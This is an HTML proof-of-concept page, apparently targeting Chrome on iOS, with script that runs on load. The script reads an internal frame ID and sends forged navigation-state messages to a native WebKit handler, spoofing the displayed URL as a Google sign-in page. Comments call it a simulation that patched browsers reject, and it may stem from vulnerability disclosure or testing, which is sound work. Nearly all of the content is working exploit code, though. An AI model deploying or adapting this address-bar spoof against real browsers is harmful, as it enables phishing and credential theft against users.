<!doctype html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <title>PoC Simulation Testbed</title>
    <style>
        body { font-family: -apple-system, sans-serif; margin: 2em; background: #fafafa; color: #333; }
        .box { background: #fff; padding: 20px; border-radius: 6px; border: 1px solid #ddd; }
        pre { background: #1e1e1e; color: #dcdcdc; padding: 12px; border-radius: 4px; font-size: 11px; }
    </style>
</head>
<body>
<div class="box">
    <h2>History State Navigation Handler Test</h2>
    <p>Target State Dispatch Simulation:</p>
    <pre id="console-log">Initializing diagnostic check...</pre>
</div>

<script>
(function() {
    function log(msg) {
        document.getElementById('console-log').textContent += '\n' + msg;
        console.log('[PoC-Sim] ' + msg);
    }

    log("Current origin: " + location.origin);
    
    // 1. Deteksi message handler platform
    var mh = (window.webkit && window.webkit.messageHandlers) || {};
    if (!mh.NavigationEventMessage) {
        log("[-] Handler 'NavigationEventMessage' not found (Patched or non-iOS environment).");
        return;
    }
    log("[+] Handler 'NavigationEventMessage' detected.");

    // 2. Simulasi pembacaan frame ID dari halaman
    var fid = null;
    try {
        if (window.__gCrWeb && typeof window.__gCrWeb.getFrameId === 'function') {
            fid = window.__gCrWeb.getFrameId();
            log("[+] Retrieved frame_id: " + fid);
        }
    } catch (e) {
        log("[-] Error reading frame_id: " + e);
    }

    if (!fid) {
        log("[-] Frame ID unavailable. Execution halted.");
        return;
    }

    // 3. Payload percobaan pengiriman state lintas domain
    // Pada versi tertambal, panggilan ini akan ditolak langsung di native layer (C++)
    var spoofTarget = 'blob:https://accounts.google.com/signin';
    
    try {
        mh.NavigationEventMessage.postMessage({
            command: 'willChangeState', 
            frame_id: fid
        });
        
        mh.NavigationEventMessage.postMessage({
            command: 'didReplaceState', 
            frame_id: fid,
            stateObject: '', 
            baseUrl: 'https://x/',
            pageUrl: spoofTarget
        });
        
        log("[+] Dispatched payload targeting: " + spoofTarget);
        log("[i] On patched browser versions, this request is securely intercepted and rejected.");
    } catch (err) {
        log("[-] Exception during postMessage: " + err);
    }
})();
</script>
</body>
</html>
